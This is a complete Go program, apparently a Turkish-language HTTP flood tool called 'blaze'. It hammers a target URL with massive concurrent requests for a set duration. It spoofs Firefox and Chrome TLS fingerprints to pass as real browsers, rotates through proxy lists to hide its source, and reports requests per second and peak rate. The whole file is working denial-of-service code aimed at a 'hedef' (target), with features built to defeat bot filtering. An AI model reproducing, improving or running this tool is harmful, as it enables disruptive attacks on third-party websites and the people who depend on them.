package main

import (
	"context"
	"fmt"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	gofire "github.com/JSInvasor/Gohttp-clientfingerprintemulateandfastest"
)

func main() {
	if len(os.Args) < 4 {
		fmt.Println("kullanim: blaze <url> <sure_sn> <thread> [stream] [method] [proxy|proxy_dosya]")
		fmt.Println("ornek:    ./blaze https://hedef.com 60 64 32")
		fmt.Println("ornek:    ./blaze https://hedef.com 60 128 50 GET socks5://127.0.0.1:1080")
		fmt.Println("ornek:    ./blaze https://hedef.com 60 128 50 GET proxies.txt")
		fmt.Println()
		fmt.Println("her iki browser (firefox+chrome) ayni anda kullanilir")
		fmt.Println()
		fmt.Println("proxy dosya formati (satir satir):")
		fmt.Println("  ip:port")
		fmt.Println("  ip:port:user:pass")
		fmt.Println("  socks5://ip:port")
		fmt.Println("  http://user:pass@ip:port")
		os.Exit(1)
	}

	targetURL := os.Args[1]
	if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
		targetURL = "https://" + targetURL
	}

	durSec := mustInt(os.Args[2], "sure")
	threads := mustInt(os.Args[3], "thread")

	streams := 32
	if len(os.Args) >= 5 {
		streams = mustInt(os.Args[4], "stream")
	}

	method := "GET"
	if len(os.Args) >= 6 {
		method = strings.ToUpper(os.Args[5])
	}

	proxyArg := ""
	if len(os.Args) >= 7 {
		proxyArg = os.Args[6]
	}

	run(targetURL, durSec, threads, streams, method, proxyArg)
}

func run(targetURL string, durSec, threads, streams int, method, proxyArg string) {
	runtime.GOMAXPROCS(runtime.NumCPU())

	totalConcurrent := threads * streams

	idlePerHost := totalConcurrent
	if idlePerHost < 256 {
		idlePerHost = 256
	}
	totalIdle := totalConcurrent * 2
	if totalIdle < 512 {
		totalIdle = 512
	}

	baseOpts := []gofire.Option{
		gofire.WithTimeout(10 * time.Second),
		gofire.WithTLSHandshakeTimeout(8 * time.Second),
		gofire.WithDialTimeout(8 * time.Second),
		gofire.WithMaxIdleConnsPerHost(idlePerHost),
		gofire.WithMaxIdleConns(totalIdle),
		gofire.WithMaxConnsPerHost(0),
		gofire.WithDNSCacheTTL(30 * time.Minute),
		gofire.WithIdleConnTimeout(120 * time.Second),
		gofire.WithMaxRedirects(3),
		gofire.WithWriteBufferSize(128 * 1024),
		gofire.WithReadBufferSize(128 * 1024),
	}

	// Detect proxy mode
	var proxyRotator *gofire.ProxyRotator
	if proxyArg != "" {
		if isProxyFile(proxyArg) {
			var err error
			proxyRotator, err = gofire.NewProxyRotatorFromFile(proxyArg)
			if err != nil {
				fmt.Fprintf(os.Stderr, "hata: proxy dosyasi yuklenemedi: %v\n", err)
				os.Exit(1)
			}
		} else {
			baseOpts = append(baseOpts, gofire.WithProxy(proxyArg))
		}
	}

	// Create both Firefox and Chrome clients
	firefoxClient, err := gofire.Emulate(gofire.Firefox148, baseOpts...)
	if err != nil {
		fmt.Fprintf(os.Stderr, "hata: firefox client olusturulamadi: %v\n", err)
		os.Exit(1)
	}
	defer firefoxClient.Close()

	chromeClient, err := gofire.Emulate(gofire.Chrome146, baseOpts...)
	if err != nil {
		fmt.Fprintf(os.Stderr, "hata: chrome client olusturulamadi: %v\n", err)
		os.Exit(1)
	}
	defer chromeClient.Close()

	// Apply proxy rotator to both clients
	if proxyRotator != nil {
		firefoxClient.SetProxyRotator(proxyRotator)
		chromeClient.SetProxyRotator(proxyRotator)
	}

	// Split threads: half Firefox, half Chrome
	firefoxThreads := threads / 2
	chromeThreads := threads - firefoxThreads

	fmt.Printf("hedef: %s | sure: %ds | thread: %d | stream: %d | toplam: %d | method: %s\n",
		targetURL, durSec, threads, streams, totalConcurrent, method)
	fmt.Printf("browser: firefox=%d thread + chrome=%d thread\n", firefoxThreads, chromeThreads)
	if proxyRotator != nil {
		fmt.Printf("proxy: %d adet (rotate)\n", proxyRotator.Count())
	} else if proxyArg != "" {
		fmt.Printf("proxy: %s\n", proxyArg)
	}

	// Test both browsers
	clients := []*gofire.Client{firefoxClient, chromeClient}
	names := []string{"firefox", "chrome"}
	for i, c := range clients {
		fmt.Printf("test [%s]... ", names[i])
		testCtx, testCancel := context.WithTimeout(context.Background(), 15*time.Second)
		resp, testErr := c.DoWithContext(testCtx, method, targetURL, nil, nil)
		testCancel()
		if testErr != nil {
			fmt.Printf("BASARISIZ: %v\n", testErr)
		} else {
			fmt.Printf("OK %d\n", resp.StatusCode())
			resp.Close()
		}
	}

	// Pre-warm both
	fmt.Print("baglanti isitiliyor... ")
	warmCtx, warmCancel := context.WithTimeout(context.Background(), 10*time.Second)
	warmCount := threads / 4
	if warmCount < 4 {
		warmCount = 4
	}
	if warmCount > 64 {
		warmCount = 64
	}
	_ = firefoxClient.PreConnect(warmCtx, targetURL, warmCount)
	_ = chromeClient.PreConnect(warmCtx, targetURL, warmCount)
	warmCancel()
	fmt.Printf("%d baglanti\n", firefoxClient.ActiveConnections()+chromeClient.ActiveConnections())

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(durSec)*time.Second)
	defer cancel()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigCh
		fmt.Println("\ndurduruluyor...")
		cancel()
	}()

	var (
		totalSent    atomic.Int64
		totalSuccess atomic.Int64
		totalFailed  atomic.Int64
		statusCodes  sync.Map
		errMu        sync.Mutex
		recentErrs   []string
		errCountMap  sync.Map
	)

	startTime := time.Now()
	fmt.Printf("basliyor... %d eszamanli (firefox+chrome)\n\n", totalConcurrent)

	// Worker launcher - spawns threads for a given client
	launchWorkers := func(wg *sync.WaitGroup, client *gofire.Client, numThreads int) {
		for i := 0; i < numThreads; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()

				sem := make(chan struct{}, streams)
				var innerWg sync.WaitGroup

				for {
					select {
					case <-ctx.Done():
						innerWg.Wait()
						return
					default:
					}

					select {
					case sem <- struct{}{}:
					case <-ctx.Done():
						innerWg.Wait()
						return
					}

					totalSent.Add(1)

					innerWg.Add(1)
					go func() {
						defer func() {
							<-sem
							innerWg.Done()
						}()

						resp, err := client.DoWithContext(ctx, method, targetURL, nil, nil)
						if err != nil {
							totalFailed.Add(1)

							errStr := err.Error()
							if len(errStr) > 200 {
								errStr = errStr[:200]
							}
							if _, loaded := errCountMap.LoadOrStore(errStr, &atomic.Int64{}); !loaded {
								errMu.Lock()
								if len(recentErrs) < 5 {
									recentErrs = append(recentErrs, errStr)
								}
								errMu.Unlock()
							}
							if val, ok := errCountMap.Load(errStr); ok {
								val.(*atomic.Int64).Add(1)
							}
							return
						}

						totalSuccess.Add(1)
						sc := resp.StatusCode()
						val, _ := statusCodes.LoadOrStore(sc, &atomic.Int64{})
						val.(*atomic.Int64).Add(1)
						resp.Close()
					}()
				}
			}()
		}
	}

	var wg sync.WaitGroup
	launchWorkers(&wg, firefoxClient, firefoxThreads)
	launchWorkers(&wg, chromeClient, chromeThreads)

	// Stats
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		var lastSent int64
		var peakRPS int64

		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				sent := totalSent.Load()
				ok := totalSuccess.Load()
				fail := totalFailed.Load()
				elapsed := time.Since(startTime).Seconds()

				rps := sent - lastSent
				lastSent = sent
				if rps > peakRPS {
					peakRPS = rps
				}

				fmt.Printf("\rsent:%d ok:%d fail:%d rps:%d peak:%d %.0fs   ",
					sent, ok, fail, rps, peakRPS, elapsed)
			}
		}
	}()

	wg.Wait()

	totalDuration := time.Since(startTime)
	sent := totalSent.Load()
	ok := totalSuccess.Load()
	fail := totalFailed.Load()

	avgRPS := float64(0)
	if totalDuration.Seconds() > 0 {
		avgRPS = float64(sent) / totalDuration.Seconds()
	}
	successRate := float64(0)
	if sent > 0 {
		successRate = float64(ok) / float64(sent) * 100
	}

	totalConns := firefoxClient.ActiveConnections() + chromeClient.ActiveConnections()

	fmt.Printf("\n\n--- sonuclar ---\n")
	fmt.Printf("gonderilen: %d\n", sent)
	fmt.Printf("basarili:   %d (%%%.1f)\n", ok, successRate)
	fmt.Printf("basarisiz:  %d\n", fail)
	fmt.Printf("sure:       %v\n", totalDuration.Round(time.Millisecond))
	fmt.Printf("ort. rps:   %.0f req/s\n", avgRPS)
	fmt.Printf("baglanti:   %d (firefox+chrome)\n", totalConns)

	// Status code dagilimi
	hasStatus := false
	statusCodes.Range(func(key, value interface{}) bool {
		if !hasStatus {
			fmt.Println("\nstatus kodlari:")
			hasStatus = true
		}
		fmt.Printf("  %d: %d\n", key.(int), value.(*atomic.Int64).Load())
		return true
	})

	// Hata mesajlari
	errMu.Lock()
	if len(recentErrs) > 0 {
		fmt.Println("\nhatalar:")
		for _, e := range recentErrs {
			count := int64(0)
			if val, ok := errCountMap.Load(e); ok {
				count = val.(*atomic.Int64).Load()
			}
			fmt.Printf("  [%dx] %s\n", count, e)
		}
	}
	errMu.Unlock()

	fmt.Println()
}

// isProxyFile checks if the argument is a file path (vs a proxy URL).
func isProxyFile(s string) bool {
	if strings.Contains(s, "://") {
		return false
	}
	if _, err := os.Stat(s); err == nil {
		return true
	}
	if strings.HasSuffix(s, ".txt") || strings.HasSuffix(s, ".list") || strings.HasSuffix(s, ".csv") {
		return true
	}
	return false
}

func mustInt(s, name string) int {
	v, err := strconv.Atoi(s)
	if err != nil || v <= 0 {
		fmt.Fprintf(os.Stderr, "hata: gecersiz %s: %s\n", name, s)
		os.Exit(1)
	}
	return v
}
